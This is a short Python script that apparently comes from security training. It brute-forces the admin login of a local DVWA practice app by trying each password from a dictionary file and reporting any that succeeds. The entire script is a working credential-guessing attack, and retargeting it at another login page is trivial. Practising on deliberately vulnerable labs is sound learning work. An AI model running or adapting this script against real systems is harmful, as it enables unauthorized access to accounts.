import requests

dict_file='/home/dojo/Desktop/passwords.txt'
u_name_list=['admin']
headers = {'Cookie':'security=low; PHPSESSID=sg3980l1mn1jr9qbcb863e7jan','Referer':'http://localhost/DVWA/index.php'}

def get_http(u_name,p_word):
    url = "http://localhost/dvwa/vulnerabilities/brute/?username="+u_name+"&password="+p_word+"&Login=Login#"
    req = requests.get(url,headers=headers)
    return(url,req.status_code,req.text)

print('Starting brutforce')
for list in u_name_list:
    u_name=list
    f = open(dict_file,'r')    
    for line in f:
        p_word = line.strip()
        url,status_code,result=get_http(u_name,p_word)
        if result.find('incorrect')==-1:
            print('Login: '+u_name+', password: '+p_word)
    f.close()